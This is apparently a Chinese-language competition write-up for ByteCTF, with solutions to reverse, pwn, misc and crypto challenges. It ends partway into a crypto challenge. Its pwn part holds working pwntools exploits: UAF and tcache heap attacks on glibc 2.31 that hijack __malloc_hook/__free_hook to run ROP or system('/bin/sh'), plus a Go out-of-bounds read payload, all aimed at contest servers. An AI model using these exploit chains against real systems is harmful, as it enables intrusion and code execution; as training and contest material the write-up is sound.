![ByteCTF](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/8uHAmpLFbUl73y5.jpg)

官方writeup： https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg


## Reverse
### DaShen Decode AES
AES的key和iv在db.db里
```python
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
import base64
import string
import time
def decrypt(text):
    key = '37eaae0141f1a3adf8a1dee655853766'.decode('hex')
    iv =  'a5efdbd57b84ca88'
    mode = AES.MODE_CBC
    cryptos = AES.new(key, mode,iv)
    plain_text = cryptos.decrypt(text)
    return plain_text
s='db6427960a6622ffac27ef5437acf1459a592d1a96b73e75490c8badb0ed294c1e9232213e63461dd2d9f6d327e51641'.decode('hex')
print decrypt(s)
#ByteCTF{fl-ag-IS-to-ng-xu-el-ih-ai}
```

### crackme
输入32个时，只用到了前四个生成32个然后判断^result == 0x5e
不满足条件从此开始pad
只要改一下sha256即可
aes128
因为用的是openssl稍微改一下即可

```c
//main.c
#define _CRT_SECURE_NO_DEPRECATE
#include <stdio.h>
#include <string.h>
#include "sha256.h"
#include <Windows.h>
#include <stdbool.h>
#include "aes.h"
uint8_t hash[SHA256_BYTES];
unsigned char flag[] = { 0x2d,0x18,0x6a,0x3e,0x17,0x2a,0x14,0x67,0x37,0x89,0xf4,0x99,0xcd,0x6c,0xfb,0xcd,0x29,0xb6,0xc7,0x3f,0x4b,0x4a,0x27,0xc2,0x34,0x64,0x77,0x68,0x25,0xaf,0x90,0xb2 };
void hex_print(unsigned char* in, size_t len) {
	for (int i = 0; i < len; i++) {
		if (i % 4 == 0)
			printf("\n");
		printf("%02X ", *(in + i));
	}
	printf("\n\n");
}
int main(void)
{
	ERR_load_crypto_strings();
	OpenSSL_add_all_algorithms();
	OPENSSL_config(NULL);
	char buf[] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
	size_t i, j, k, l, temp, jj, aaa;
	char table[] = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-=|;:.,~";
	Message* dec_msg;
	Message* message;// = message_init(32);
	/*
	strncpy((char*)message->body, flag,32);
	if (aes256_init(message,hash)) {
		puts("Error: Couldn't initialize message with aes data!");
		return 1;
	}
	dec_msg = aes256_encrypt(message);
	getchar();*/
	
	for (temp = 0; temp < 82; temp++)
	{
		for (jj = 0; jj < 82; jj++)
		{
			for (k = 0; k < 82; k++)
			{
				for (l = 0; l < 82; l++)
				{
					buf[0] = table[temp];
					buf[1] = table[jj];
					buf[2] = table[k];
					buf[3] = table[l];
					for (aaa = 4; aaa < 32; aaa++)
					{
						buf[aaa] = buf[aaa - 4];
					}
					sha256(buf, strlen(buf), hash);
					//printf("input = '%s'\nresult: ", buf);
					message = message_init(32);
					strncpy((char*)message->body, flag, 32);
					if (aes256_init(message, hash)) {
						puts("Error: Couldn't initialize message with aes data!");
						return 1;
					}
					dec_msg = aes256_decrypt(message);
					if (dec_msg == NULL)
					{
						continue;
					}
					//printf("yes\n");
					if((char*)dec_msg->body[0]==0x42 && (char*)dec_msg->body[1] == 0x79 && (char*)dec_msg->body[2] == 0x74 && (char*)dec_msg->body[3] == 0x65)
					printf("%s", (char*)dec_msg->body);
					
					//getchar();
				}
			}
		}
	}
	/*
	for (i = 0; i < (sizeof(buf) / sizeof(buf[0])); i += 2) {
		sha256(buf[i], strlen(buf[i]), hash);
		printf("input = '%s'\nresult: ", buf[i]);
		for (j = 0; j < SHA256_BYTES; j++)
			printf("%02x%s", hash[j], ((j % 4) == 3) ? " " : "");
		printf("\n\n");
	}*/
	return 0;
}
```

```c
/*
*   SHA-256 implementation, Mark 2
*
*   Copyright (c) 2010,2014 Ilya O. Levin, http://www.literatecode.com
*
*   Permission to use, copy, modify, and distribute this software for any
*   purpose with or without fee is hereby granted, provided that the above
*   copyright notice and this permission notice appear in all copies.
*
*   THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
*   WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
*   MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
*   ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
*   WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
*   ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
*   OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/
#include "sha256.h"
/* #define MINIMIZE_STACK_IMPACT */

#ifdef __cplusplus
extern "C" {
#endif

#define FN_ inline static

	static const uint32_t K[64] = {
		0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
		0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
		0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
		0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
		0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
		0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
		0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
		0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
		0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
		0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
		0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
		0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
		0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
		0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
		0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
		0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
	};

#ifdef MINIMIZE_STACK_IMPACT
	static uint32_t W[64];
#endif

	/* -------------------------------------------------------------------------- */
	FN_ uint8_t _shb(uint32_t x, uint32_t n)
	{
		return ((x >> (n & 31)) & 0xff);
	} /* _shb */

	/* -------------------------------------------------------------------------- */
	FN_ uint32_t _shw(uint32_t x, uint32_t n)
	{
		return ((x << (n & 31)) & 0xffffffff);
	} /* _shw */

	/* -------------------------------------------------------------------------- */
	FN_ uint32_t _r(uint32_t x, uint8_t n)
	{
		return ((x >> n) | _shw(x, 32 - n));
	} /* _r */

	/* -------------------------------------------------------------------------- */
	FN_ uint32_t _Ch(uint32_t x, uint32_t y, uint32_t z)
	{
		return ((x & y) ^ ((~x) & z));
	} /* _Ch */

	/* -------------------------------------------------------------------------- */
	FN_ uint32_t _Ma(uint32_t x, uint32_t y, uint32_t z)
	{
		return ((x & y) ^ (x & z) ^ (y & z));
	} /* _Ma */

	/* -------------------------------------------------------------------------- */
	FN_ uint32_t _S0(uint32_t x)
	{
		return (_r(x, 2) ^ _r(x, 13) ^ _r(x, 22));
	} /* _S0 */

	/* -------------------------------------------------------------------------- */
	FN_ uint32_t _S1(uint32_t x)
	{
		return (_r(x, 6) ^ _r(x, 11) ^ _r(x, 25));
	} /* _S1 */

	/* -------------------------------------------------------------------------- */
	FN_ uint32_t _G0(uint32_t x)
	{
		return (_r(x, 7) ^ _r(x, 18) ^ (x >> 3));
	} /* _G0 */

	/* -------------------------------------------------------------------------- */
	FN_ uint32_t _G1(uint32_t x)
	{
		return (_r(x, 17) ^ _r(x, 19) ^ (x >> 10));
	} /* _G1 */

	/* -------------------------------------------------------------------------- */
	FN_ uint32_t _word(uint8_t* c)
	{
		return (_shw(c[0], 24) | _shw(c[1], 16) | _shw(c[2], 8) | (c[3]));
	} /* _word */

	/* -------------------------------------------------------------------------- */
	FN_ void  _addbits(sha256_context* ctx, uint32_t n)
	{
		if (ctx->bits[0] > (0xffffffff - n))
			ctx->bits[1] = (ctx->bits[1] + 1) & 0xFFFFFFFF;
		ctx->bits[0] = (ctx->bits[0] + n) & 0xFFFFFFFF;
	} /* _addbits */

	/* -------------------------------------------------------------------------- */
	static void _hash(sha256_context* ctx)
	{
		register uint32_t a, b, c, d, e, f, g, h, i;
		uint32_t t[2];
#ifndef MINIMIZE_STACK_IMPACT
		uint32_t W[64];
#endif

		a = ctx->hash[0];
		b = ctx->hash[1];
		c = ctx->hash[2];
		d = ctx->hash[3];
		e = ctx->hash[4];
		f = ctx->hash[5];
		g = ctx->hash[6];
		h = ctx->hash[7];

		for (i = 0; i < 64; i++) {
			if (i < 16)
				W[i] = _word(&ctx->buf[_shw(i, 2)]);
			else
				W[i] = _G1(W[i - 2]) + W[i - 7] + _G0(W[i - 15]) + W[i - 16];

			t[0] = h + _S1(e) + _Ch(e, f, g) + K[i] + W[i];
			t[1] = _S0(a) + _Ma(a, b, c);
			h = g;
			g = f;
			f = e;
			e = d + t[0];
			d = c;
			c = b;
			b = a;
			a = t[0] + t[1];
		}

		ctx->hash[0] += a;
		ctx->hash[1] += b;
		ctx->hash[2] += c;
		ctx->hash[3] += d;
		ctx->hash[4] += e;
		ctx->hash[5] += f;
		ctx->hash[6] += g;
		ctx->hash[7] += h;
	} /* _hash */

	/* -------------------------------------------------------------------------- */
	void sha256_init(sha256_context* ctx)
	{
		if (ctx != NULL) {
			ctx->bits[0] = ctx->bits[1] = 0;
			ctx->len = 0;
			ctx->hash[0] = 0x6a09e667;
			ctx->hash[1] = 0xbb67ae85;
			ctx->hash[2] = 0x3c6ef372;
			ctx->hash[3] = 0xa54ff53a;
			ctx->hash[4] = 0x510e527f;
			ctx->hash[5] = 0x9b05688c;
			ctx->hash[6] = 0x1f83d9ab;
			ctx->hash[7] = 0x5be0cd19;
		}
	} /* sha256_init */

	/* -------------------------------------------------------------------------- */
	void sha256_hash(sha256_context* ctx, const void* data, size_t len)
	{
		register size_t i;
		const uint8_t* bytes = (const uint8_t*)data;

		if ((ctx != NULL) && (bytes != NULL))
			for (i = 0; i < len; i++) {
				ctx->buf[ctx->len] = bytes[i];
				ctx->len++;
				if (ctx->len == sizeof(ctx->buf)) {
					_hash(ctx);
					_addbits(ctx, 4 * 8);
					ctx->len = 0;
				}
			}
	} /* sha256_hash */

	/* -------------------------------------------------------------------------- */
	void sha256_done(sha256_context* ctx, uint8_t* hash)
	{
		register uint32_t i, j,k;

		if (ctx != NULL) {
			/*
			j = ctx->len % sizeof(ctx->buf);
			ctx->buf[j] = 0x80;*/
			for (k = 4; k < 32; k++)
			{
				if ((ctx->buf[k] ^ k) != 0x5e)
				{
					j = k;
					ctx->buf[j] = 0x80;
					break;
				}
			}
			for (i = j + 1; i < sizeof(ctx->buf); i++)
				ctx->buf[i] = 0x00;

			if (ctx->len > 55) {
				_hash(ctx);
				for (j = 0; j < sizeof(ctx->buf); j++)
					ctx->buf[j] = 0x00;
			}

			_addbits(ctx, ctx->len * 8);
			ctx->buf[63] = _shb(ctx->bits[0], 0);
			ctx->buf[62] = _shb(ctx->bits[0], 8);
			ctx->buf[61] = _shb(ctx->bits[0], 16);
			ctx->buf[60] = _shb(ctx->bits[0], 24);
			ctx->buf[59] = _shb(ctx->bits[1], 0);
			ctx->buf[58] = _shb(ctx->bits[1], 8);
			ctx->buf[57] = _shb(ctx->bits[1], 16);
			ctx->buf[56] = _shb(ctx->bits[1], 24);
			_hash(ctx);

			if (hash != NULL)
				for (i = 0, j = 24; i < 4; i++, j -= 8) {
					hash[i] = _shb(ctx->hash[0], j);
					hash[i + 4] = _shb(ctx->hash[1], j);
					hash[i + 8] = _shb(ctx->hash[2], j);
					hash[i + 12] = _shb(ctx->hash[3], j);
					hash[i + 16] = _shb(ctx->hash[4], j);
					hash[i + 20] = _shb(ctx->hash[5], j);
					hash[i + 24] = _shb(ctx->hash[6], j);
					hash[i + 28] = _shb(ctx->hash[7], j);
				}
		}
	} /* sha256_done */

	/* -------------------------------------------------------------------------- */
	void sha256(const void* data, size_t len, uint8_t* hash)
	{
		sha256_context ctx;

		sha256_init(&ctx);
		sha256_hash(&ctx, data, len);
		sha256_done(&ctx, hash);
	} /* sha256 */


	/* ========================================================================== */
#ifdef SELF_TEST

#include <stdio.h>
#include <string.h>

	int main(void)
	{
		char* buf[] = {
			"",
			"e3b0c442 98fc1c14 9afbf4c8 996fb924 27ae41e4 649b934c a495991b 7852b855",

			"abc",
			"ba7816bf 8f01cfea 414140de 5dae2223 b00361a3 96177a9c b410ff61 f20015ad",

			"abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq",
			"248d6a61 d20638b8 e5c02693 0c3e6039 a33ce459 64ff2167 f6ecedd4 19db06c1",

			"The quick brown fox jumps over the lazy dog",
			"d7a8fbb3 07d78094 69ca9abc b0082e4f 8d5651e4 6d3cdb76 2d02d0bf 37c9e592",

			"The quick brown fox jumps over the lazy cog", /* avalanche effect test */
			"e4c4d8f3 bf76b692 de791a17 3e053211 50f7a345 b46484fe 427f6acc 7ecc81be",

			"bhn5bjmoniertqea40wro2upyflkydsibsk8ylkmgbvwi420t44cq034eou1szc1k0mk46oeb7ktzmlxqkbte2sy",
			"9085df2f 02e0cc45 5928d0f5 1b27b4bf 1d9cd260 a66ed1fd a11b0a3f f5756d99"
		};
		uint8_t hash[SHA256_BYTES];
		size_t i, j;

		for (i = 0; i < (sizeof(buf) / sizeof(buf[0])); i += 2) {
			sha256(buf[i], strlen(buf[i]), hash);
			printf("input = '%s'\ndigest: %s\nresult: ", buf[i], buf[i + 1]);
			for (j = 0; j < SHA256_BYTES; j++)
				printf("%02x%s", hash[j], ((j % 4) == 3) ? " " : "");
			printf("\n\n");
		}

		return 0;
	} /* main */

#endif /* def SELF_TEST */

#ifdef __cplusplus
}
#endif
//sha256.c
```

```c
#define _CRT_SECURE_NO_DEPRECATE
#include "aes.h"
#define SHA256_BYTES    32
extern uint8_t hash[SHA256_BYTES];
Message* message_init(int length) {
    Message* ret = malloc(sizeof(Message));
    ret->body = malloc(length);
    ret->length = malloc(sizeof(int));
    *ret->length = length;
    //used string terminator to allow string methods to work
    memset(ret->body, '\0', length);
    //initialize aes_data
    aes256_init(ret);
    return ret;
}

int aes256_init(Message* input) {
    AES_DATA* aes_info = malloc(sizeof(AES_DATA));
    aes_info->key = malloc(sizeof(char) * AES_KEY_SIZE);
    aes_info->iv = malloc(sizeof(char) * AES_KEY_SIZE);
    //point to new data
    input->aes_settings = aes_info;
    //set to zero
    memset(input->aes_settings->key, 0, AES_KEY_SIZE);
    memset(input->aes_settings->iv, 0, AES_KEY_SIZE);
    //get rand bytes
    strncpy(input->aes_settings->key, hash, 16);
    strncpy(input->aes_settings->iv, (hash+16), 16);
    return 0;
}

Message* aes256_encrypt(Message* plaintext) {
    EVP_CIPHER_CTX* enc_ctx;
    Message* encrypted_message;
    int enc_length = *(plaintext->length) + (AES_BLOCK_SIZE - *(plaintext->length) % AES_BLOCK_SIZE);

    encrypted_message = message_init(enc_length);
    //set up encryption context
    enc_ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit(enc_ctx, EVP_aes_256_cbc(), plaintext->aes_settings->key, plaintext->aes_settings->iv);
    //encrypt all the bytes up to but not including the last block
    if (!EVP_EncryptUpdate(enc_ctx, encrypted_message->body, &enc_length, plaintext->body, *plaintext->length)) {
        EVP_CIPHER_CTX_cleanup(enc_ctx);
        printf("EVP Error: couldn't update encryption with plain text!\n");
        return NULL;
    }
    //update length with the amount of bytes written
    *(encrypted_message->length) = enc_length;
    //EncryptFinal will cipher the last block + Padding
    if (!EVP_EncryptFinal_ex(enc_ctx, enc_length + encrypted_message->body, &enc_length)) {
        EVP_CIPHER_CTX_cleanup(enc_ctx);
        printf("EVP Error: couldn't finalize encryption!\n");
        return NULL;
    }
    //add padding to length
    *(encrypted_message->length) += enc_length;
    //no errors, copy over key & iv rather than pointing to the plaintext msg
    memcpy(encrypted_message->aes_settings->key, plaintext->aes_settings->key, AES_KEY_SIZE);
    memcpy(encrypted_message->aes_settings->iv, plaintext->aes_settings->iv, AES_KEY_SIZE);
    //Free context and return encrypted message
    EVP_CIPHER_CTX_cleanup(enc_ctx);
    return encrypted_message;
}

Message* aes256_decrypt(Message* encrypted_message) {
    EVP_CIPHER_CTX* dec_ctx;
    int dec_length = 0;
    Message* decrypted_message;
    //initialize return message and cipher context
    decrypted_message = message_init(*encrypted_message->length);
    dec_ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit(dec_ctx, EVP_aes_256_cbc(), encrypted_message->aes_settings->key, encrypted_message->aes_settings->iv);
    //same as above
    if (!EVP_DecryptUpdate(dec_ctx, decrypted_message->body, &dec_length, encrypted_message->body, *encrypted_message->length)) {
        EVP_CIPHER_CTX_cleanup(dec_ctx);
        printf("EVP Error: couldn't update decrypt with text!\n");
        return NULL;
    }
    *(decrypted_message->length) = dec_length;
    if (!EVP_DecryptFinal_ex(dec_ctx, *decrypted_message->length + decrypted_message->body, &dec_length)) {
        EVP_CIPHER_CTX_cleanup(dec_ctx);
        //printf("EVP Error: couldn't finalize decryption!\n");
        return NULL;
    }
    //auto handle padding
    *(decrypted_message->length) += dec_length;
    //Terminate string for easier use.
    *(decrypted_message->body + *decrypted_message->length) = '\0';
    //no errors, copy over key & iv rather than pointing to the encrypted msg
    memcpy(decrypted_message->aes_settings->key, encrypted_message->aes_settings->key, AES_KEY_SIZE);
    memcpy(decrypted_message->aes_settings->iv, encrypted_message->aes_settings->iv, AES_KEY_SIZE);
    //free context and return decrypted message
    EVP_CIPHER_CTX_cleanup(dec_ctx);
    return decrypted_message;
}

void aes_cleanup(AES_DATA* aes_data) {
    free(aes_data->iv);
    free(aes_data->key);
    free(aes_data);
}

void message_cleanup(Message* message) {
    //free message struct
    aes_cleanup(message->aes_settings);
    free(message->length);
    free(message->body);
    free(message);
}
//aes.c
```
```c

#ifndef AES_H_
#define AES_H_

#include <stdlib.h>
#include <string.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>

#define AES_BLOCK_SIZE 16
#define AES_KEY_SIZE 16

typedef struct _AES_DATA
{
    unsigned char* key;
    unsigned char* iv;
} AES_DATA;

typedef struct Message_Struct
{
    unsigned char* body;
    int* length;
    AES_DATA* aes_settings;

} Message;

Message* message_init(int);

int aes256_init(Message*);

Message* aes256_encrypt(Message*);

Message* aes256_decrypt(Message*);

void aes_cleanup(AES_DATA*);
void message_cleanup(Message*);



#endif
//aes.h
```
```c
#pragma once
/*
*   SHA-256 implementation, Mark 2
*
*   Copyright (c) 2010,2014 Ilya O. Levin, http://www.literatecode.com
*
*   Permission to use, copy, modify, and distribute this software for any
*   purpose with or without fee is hereby granted, provided that the above
*   copyright notice and this permission notice appear in all copies.
*
*   THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
*   WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
*   MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
*   ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
*   WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
*   ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
*   OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/
#ifndef SHA256_H_
#define SHA256_H_

#include <stddef.h>
#ifdef _MSC_VER
#ifndef uint8_t
typedef unsigned __int8 uint8_t;
#endif
#ifndef uint32_t
typedef unsigned __int32 uint32_t;
#endif
#else
#include <stdint.h>
#endif

#define SHA256_BYTES    32

#ifdef __cplusplus
extern "C"
{
#endif

	typedef struct {
		uint8_t  buf[64];
		uint32_t hash[8];
		uint32_t bits[2];
		uint32_t len;
	} sha256_context;

	void sha256_init(sha256_context* ctx);
	void sha256_hash(sha256_context* ctx, const void* data, size_t len);
	void sha256_done(sha256_context* ctx, uint8_t* hash);

	void sha256(const void* data, size_t len, uint8_t* hash);

#ifdef __cplusplus
}
#endif

#endif
//sha256.h
```

### qiao
明文比较题目
虽然有很多vm
分别是
malloc
genaeskey
init aes key
aes enc
free
最后直接明文比较
每次都加密waqqeniiiiaarsoo
key  V2hlcmUgdGhlcmUg

## Pwn
### gun
UAF的洞,分配两个大块,然后释放让他们合并,再切割,其中的某个块的chunk header就能通过切割出来的chunk包含进去,之后则是清空数据,绕过tcache的check
利用则是修改stderr的chain指针指向一个堆上构造的IO,此外还要修改malloc_hook 为setcontext+61,即可通过SROP进行ORW
```python
from pwn import*
context.binary = './main'
def menu(ch):
	p.sendlineafter('Action>',str(ch))
def new(size,content):
	menu(3)
	p.sendlineafter('price:',str(size))
	p.sendafter('Name:',content)
def load(index):
	menu(2)
	p.sendlineafter('load?',str(index))
def free(times):
	menu(1)
	p.sendlineafter('time: ',str(times))
p = process('./main')
p = remote('123.57.209.176',30772)
libc =ELF('./libc-2.31.so')
p.sendlineafter('Your name: ','FMYY')
for i in range(3):
	new(0x10,'FMYY\n')
new(0x420,'FMYY\n')
new(0x420,'fmyy\n')
new(0x10,'FMYY\n')

load(4)
load(3)
free(2)

new(0x20,'\n')
load(3)
free(1)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x70 - 0x120 - 0x3E0
log.info('LIBC:\t' + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
malloc_hook = libc_base + libc.sym['__malloc_hook']
new(0x20,'F'*0x10 + '\n')
load(3)
free(1)
p.recvuntil('F'*0x10)
heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x2C0 - 0x60
log.info('HEAP:\t' + hex(heap_base))
#############################################

###########3
pop_rdi_ret = libc_base + 0x0000000000026B72
pop_rdx_r12 = libc_base + 0x000000000011C371
pop_rsi_ret = libc_base + 0x0000000000027529
pop_rax_ret = libc_base + 0x000000000004A550
jmp_rsi  = libc_base + 0x000000000013927D


syscall = libc_base + libc.sym['syscall']

target = libc_base + libc.sym['_IO_2_1_stdin_']
address = libc.sym['__free_hook'] + libc_base
IO_str_jumps = libc_base + 0x1ED560

Open = libc_base + libc.symbols["open"]
Read = libc_base + libc.symbols["read"]
Puts = libc_base + libc.symbols['puts']
free_hook = address
IO  = '\x00'*0x28
IO += p64(heap_base + 0x360 + 0xE0)
IO  = IO.ljust(0xD8,'\x00')
IO += p64(IO_str_jumps)
read = libc_base + libc.sym['read']
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = address
frame.rdx = 0x2000
frame.rsp = address
frame.rip = Read


orw  = p64(pop_rdi_ret)+p64(free_hook + 0xF8)
orw += p64(pop_rsi_ret)+p64(0)
orw += p64(Open)
orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rdx_r12) + p64(0x30) + p64(0)
orw += p64(pop_rsi_ret) + p64(free_hook+0x100)
orw += p64(Read)
orw += p64(pop_rdi_ret)+p64(free_hook+0x100)
orw += p64(Puts)
orw  = orw.ljust(0xF8,'\x00')
orw += './flag\x00\x00'
IO += str(frame)
########################################
for i in range(3):
	load(i)
free(3)
new(0x3E0,IO + '\n')
new(0x31,p64(0) + p64(0x21) + '\x00'*0x18 + p64(0x21) + '\n')
free(1)

load(1)
free(1)
new(0x31,p64(0) + p64(0x21) + p64(libc_base + libc.sym['_IO_2_1_stderr_'] + 0x68) + '\n')
new(0x10,'FMYY\n')
new(0x10,p64(heap_base + 0x360) + '\n')

load(1)
load(2)
free(2)

new(0x31,p64(0) + p64(0x21) + p64(malloc_hook) + '\n')
new(0x10,'FMYY\n')
new(0x10,p64(libc_base + libc.sym['setcontext'] + 61) + '\n')

menu(4)
p.sendlineafter('Goodbye!',orw)
p.interactive()
```
### easy_heap
add的时候,第一次输入的size可以通过控制,然后在后面有个 *(ptr+size-1)=0,从而进行堆上任意地址写0,首先切割unsorted bin chunk,leak出libc,然后构造tcache的double free打free_hook即可
```python
from pwn import*
#context.log_level ='DEBUG'
p = process('./main')
p = remote('123.57.209.176',30774)
def menu(ch):
	p.sendlineafter('>>',str(ch))
def new(size,content):
	menu(1)
	p.sendlineafter('Size:',str(size))
	p.sendafter('Content',content)
def show(index):
	menu(2)
	p.sendlineafter('Index',str(index))
def free(index):
	menu(3)
	p.sendlineafter('Index',str(index))
def N(size,sz,content):
	menu(1)
	p.sendlineafter('Size:',str(size))
	p.sendlineafter('Size:',str(sz))
	p.sendafter('Content',content)
libc =ELF('./libc-2.31.so')
for i in range(8):
	new(0x80,'FMYY\n')
for i in range(7):
	free(7 - i)
free(0)
N(0x200,1,'\xE0') #0
show(0)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 352 - 0x10
log.info('LIBC:\t' + hex(libc_base))

new(0x70,'FMYY\n') #1
new(0x60,'FMYY\n') #2
new(0x50,'FMYY\n') #3
new(0x50,'FMYY\n') #4
new(0x50,'FMYY\n') #5
free(3)
free(5)
free(4)
N(-0xBF,0x40,'FMYY\n') #3
new(0x50,p64(libc_base + libc.sym['__free_hook']) + '\n') #4
new(0x50,'/bin/sh\x00\n') #5
new(0x50,p64(libc_base + libc.sym['system']) + '\n')
free(5)

p.interactive()
```

### leak
在下载了一个1.13.15的Go的程序后,手动调试发现hack中定义的数组或者整型变量 是在main函数中数组的上方不远处 
因为Golang貌似在没有包括unsafe库的情况下,不能直接操纵内存,所以就去查有没有相关的数组越界分析 
结果发现知乎有个最新的文章说了下因为Go编译器优化导致数组存在越界,所以根据上面的链接找到了对应issue的payload,改都不用改就能越界读出flag中的每一个字节,感觉这个题就是个社工题,面向搜索引擎做题,就看谁先找到了 :( 
issue:	https://github.com/golang/go/issues/40367 
知乎文章分析: https://zhuanlan.zhihu.com/p/166378003 
```python
from pwn import*

p = remote('123.56.96.75',30775)
payload = '''
func hack() {
	
	rates := []uint64{0xFF}
	for star ,rate := range rates{
		if star+1 < 1{
			panic("")
		}
		println(rate)
	}
}
'''
p.sendafter('code:',payload + '#')
p.recvuntil('4531949\n')
FLAG  = ''
for i in range(0x2D):
	FLAG += chr(int(p.recvline(),10) - 1)
log.info('FLAG:\t' + FLAG)
pause()
p.close()
```

## Misc
### Double Game
本地玩游戏，win了之后，客户端会给远程服务器发time和answer。

远程服务器会检验time是否超过当前时间30s，这边能绕过。可以先预先设定一个时间点（比如说下午1点），然后把client端的seed_time写死：`seed_time = 1603602600`，在此之前游戏win就行。

游戏是贪吃蛇+俄罗斯方块，虽然是同时操作，不过难不倒我，玩了3次就win了，真简单，就这？

win后得到数据：

```json
{"time": 1603602000,"answer": [261, 261, 261, 261, 261, 261, 261, 258, 258, 258, 258, 258, 258, 258, 259, 259, 259, 261, 258, 258, 258, 258, 258, 258, 258, 258, 258, 258, 259, 259, 259, 259, 259, 260, 260, 260, 259, 259, 260, 258, 258, 258, 260, 258, 258, 258, 258, 258, 261, 261, 258, 260, 260, 258, 258, 258, 258, 259, 261, 261, 260, 260, 260, 260, 260, 261, 258, 258, 258, 258, 261, 259, 259, 259, 259, 258, 258, 258, 258, 258, 258, 258, 258, 259, 260, 260, 260, 260, 258, 258, 258, 258, 258, 260, 260, 260, 259, 260, 259, 261, 259, 261, 261, 261, 261, 261, 261, 261, 261, 261, 261, 261, 261, 261, 258, 258, 259, 259, 261, 258, 258, 258, 258, 261, 261, 261, 261, 259, 259, 258, 258, 258, 258, 258, 258, 258, 258, 258, 258, 259, 259, 260, 260, 261, 258, 258, 258, 258, 258, 258, 258, 258, 260, 260, 259, 259, 259, 259, 261, 259, 259, 259, 259, 260, 260, 259, 261, 261, 261, 261, 261, 258, 258, 258, 258, 258, 258, 258, 260, 260, 260, 260, 260, 260, 260, 260, 260, 260, 260, 260, 261, 261, 258, 258, 258, 258, 258, 260, 261, 261, 260, 258, 261, 261, 258, 259, 259, 259, 258, 258, 258, 258, 258, 258, 258, 260, 260, 260, 260, 260, 258, 258, 258, 258, 258, 260, 260, 260, 258, 258, 258, 258, 260, 260, 260, 260, 260, 259, 259, 259, 258, 258, 258, 258, 258, 258, 258, 258, 260, 260, 260, 260, 260, 260, 259, 259, 258, 258, 261, 261, 261, 261, 261, 261, 261, 261, 261, 261, 261, 258, 258, 258, 258, 258, 258, 258, 258, 258, 258, 258, 258, 258, 260, 260, 260, 260, 260, 260, 260, 260, 261, 258, 258, 258, 260, 258, 258, 260, 261, 258, 258, 261, 261, 261, 261, 261, 259, 261, 260, 258, 258, 258, 261, 258, 258, 258, 258, 258, 258, 258, 258, 258, 259, 259, 259, 261, 261, 261, 261, 261, 261, 261, 261, 261, 261, 261, 261, 261, 260, 258, 258, 258, 258, 258, 258, 260, 259, 259, 260, 260, 258, 258, 258, 258, 258, 258, 259, 258, 258, 258, 258, 260, 261, 258, 258, 258, 258, 260, 258, 258, 258, 258, 258, 258, 258, 258, 258, 259, 260, 260, 260, 261, 261, 261, 261, 261, 259, 260, 260, 260, 258, 258, 258, 258, 259, 259, 259, 261, 261, 261, 261, 261, 261, 261, 261, 261, 261, 258, 258, 258, 258, 258, 258, 258]}
```

本地服务端patch了对时间的判断，发送数据可以win拿到flag。

然后等到点（下午1点整）了后，发给服务器就能拿到flag

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/JmpOQIuFtU2rHCx.png)

推荐的视频也挺有意思的，hhh

### checkin
签到题

### survey
问卷题


## Crypto
### noise
服务器预先用urandom生成一个1024-bit的secret，然后提供64次选择机会。

god选项，服务器会接受一个num，然后生成一个992-bit的随机数$r$并计算
$$
